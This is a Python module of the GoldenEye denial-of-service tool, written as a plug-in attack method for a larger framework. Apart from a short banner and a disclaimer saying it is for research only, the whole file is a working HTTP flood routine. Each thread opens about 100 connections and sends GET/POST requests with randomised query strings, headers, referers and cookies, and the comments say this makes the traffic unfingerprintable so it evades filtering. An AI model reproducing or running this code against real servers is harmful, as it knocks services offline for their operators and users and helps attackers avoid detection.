r"""
     /$$$$$$            /$$       /$$                     /$$$$$$$$
    /$$__  $$          | $$      | $$                    | $$_____/
   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$
   | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
   | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
   | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
   |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
    \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
                                                                     /$$  | $$
                                                                    |  $$$$$$/
                                                                     \______/
This tool is a dos tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.
This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Seidl <http://wroot.org/>

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

import time, http.client, ssl
from random import choice, randint, randrange, random
from urllib.parse import urlparse
from src.core import Core
from src.utils import *
from src.useragent import *
from src.referer import *

HTTPCLIENT = http.client

def buildblock(size):
    out_str = ''

    _LOWERCASE = list(range(97, 122))
    _UPPERCASE = list(range(65, 90))
    _NUMERIC   = list(range(48, 57))
    validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

    for _ in range(size):
        out_str += chr(choice(validChars))

    return out_str

def generateQueryString(amount=1):
    queryString = []

    for _ in range(amount):

        key = buildblock(randint(3,10))
        value = buildblock(randint(3,20))
        element = f"{key}={value}"
        queryString.append(element)

    return '&'.join(queryString)

def generateRequestUrl(url, param_joiner='?'):
    return url + param_joiner + generateQueryString(randint(1,5))

def generateRandomHeaders(url):
    # Random no-cache entries
    noCacheDirectives = ['no-cache', 'max-age=0']
    shuffle(noCacheDirectives)
    nrNoCache = randint(1, (len(noCacheDirectives)-1))
    noCache = ', '.join(noCacheDirectives[:nrNoCache])

    # Random accept encoding
    acceptEncoding = ['\'\'','*','identity','gzip','deflate']
    shuffle(acceptEncoding)
    nrEncodings = randint(1,int(len(acceptEncoding)/2))
    roundEncodings = acceptEncoding[:nrEncodings]

    http_headers = {
        'User-Agent': getAgent(),
        'Cache-Control': noCache,
        'Accept-Encoding': ', '.join(roundEncodings),
        'Connection': 'keep-alive',
        'Keep-Alive': randint(1,1000),
        'Host': urlparse(url).netloc,
    }

    # Randomly-added headers
    # These headers are optional and are
    # randomly sent thus making the
    # header count random and unfingerprintable
    if randrange(2) == 0:
        # Random accept-charset
        acceptCharset = [ 'ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15', ]

        shuffle(acceptCharset)
        http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(acceptCharset[0], acceptCharset[1],round(random(), 1), round(random(), 1))

    if randrange(2) == 0:
        # Random Referer
        url_part = buildblock(randint(5,10))
        random_referer = getReferer() + url_part
        if randrange(2) == 0:
            random_referer = random_referer + '?' + generateQueryString(randint(1, 10))

        http_headers['Referer'] = random_referer

    if randrange(2) == 0:
        # Random Content-Trype
        http_headers['Content-Type'] = choice(['multipart/form-data', 'application/x-url-encoded'])

    if randrange(2) == 0:
        # Random Cookie
        http_headers['Cookie'] = generateQueryString(randint(1, 5))

    return http_headers

def generateData(url):
    param_joiner = "?"

    if len(url) == 0: url = '/'
    if url.count("?") > 0: param_joiner = "&"

    request_url = generateRequestUrl(url, param_joiner)
    http_headers = generateRandomHeaders(url)

    return (request_url, http_headers)

def createPayload(url):
    req_url, headers = generateData(url)

    random_keys = list(headers.keys())
    shuffle(random_keys)
    random_headers = {}

    for header_name in random_keys:
        random_headers[header_name] = headers[header_name]

    return (req_url, random_headers)

def flood(attack_id, url, stoptime) -> None:

    if not Core.target_host: Core.target_host = urlparse(url).netloc # set host if not already set
    if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else 80 # set port if not already set

    sockets = []
    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        try:

            while len(sockets) != 100: # every thread will open 100 sockets each
                if Core.target_port == 443: c = HTTPCLIENT.HTTPSConnection(Core.target_host, Core.target_port, context=ssl._create_unverified_context())
                else: c = HTTPCLIENT.HTTPConnection(Core.target_host, Core.target_port)

                sockets.append(c)
            
            for sock in sockets:
                (url, headers) = createPayload(url)

                sock.request(choice(['GET','POST']), url, None, headers)
                Core.infodict[attack_id]['req_sent'] += 1
            
            for sock in sockets:
                try: sock.close(); sockets.pop(sock, None)
                except: pass

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'GOLDENEYE': {
        'info': 'GoldeneEye dos tool, written by Jan Seidl',
        'func': flood
    }
})